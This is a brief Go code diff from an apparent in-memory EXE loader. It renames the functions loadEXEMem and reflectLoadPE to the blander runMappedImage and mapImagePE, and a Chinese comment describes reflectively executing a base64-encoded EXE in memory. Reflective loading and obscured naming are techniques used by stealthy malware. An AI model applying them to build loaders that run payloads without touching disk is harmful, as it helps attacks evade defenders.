@@ -195,11 +195,11 @@ func redirectExitImports(base uintptr, info *memPE) int {
 	return redirected
 }
 
-// loadEXEMem 反射式内存执行 EXE，并把 args 作为命令行参数传入。
+// runMappedImage 反射式内存执行 EXE，并把 args 作为命令行参数传入。
 //
 // imageName 作为 argv[0]（为空时用 "program.exe"）；waitMs > 0 时等待线程结束
 // 并返回退出码，否则立即返回（程序继续在后台线程运行）。
-func loadEXEMem(dataB64, args, imageName string, waitMs int) (string, int32, string) {
+func runMappedImage(dataB64, args, imageName string, waitMs int) (string, int32, string) {
 	raw, err := base64.StdEncoding.DecodeString(dataB64)
 	if err != nil {
 		return "", -1, fmt.Sprintf("base64 decode failed: %v", err)
@@ -231,7 +231,7 @@ func loadEXEMem(dataB64, args, imageName string, waitMs int) (string, int32, str
 		}
 	}
 
-	base, info, err := reflectLoadPE(raw)
+	base, info, err := mapImagePE(raw)
 	if err != nil {
 		restore()
 		return "", -1, fmt.Sprintf("reflective load failed: %v", err)
